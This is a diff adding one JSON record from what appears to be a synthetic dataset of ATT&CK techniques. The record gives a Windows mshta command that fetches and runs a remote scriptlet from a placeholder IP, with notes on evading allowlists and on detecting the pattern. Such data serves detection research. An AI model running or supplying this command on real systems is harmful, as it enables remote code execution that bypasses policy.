@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "mshta.exe javascript:GetObject(\"script:https://198.51.100.55/a.sct\")",
+  "explanation": "Directly uses mshta as a script proxy to retrieve and run a remote scriptlet. mshta is a trusted Windows binary commonly allowed by policy.",
+  "rationale_steps": [
+    "From PowerShell, launch mshta with a javascript: URL to create a script execution context.",
+    "Invoke GetObject with the script: moniker to execute a remote .sct payload.",
+    "Relies on signed mshta to proxy execution; defenders should flag javascript:/script: pairs in mshta command lines."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-d150a3ab",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
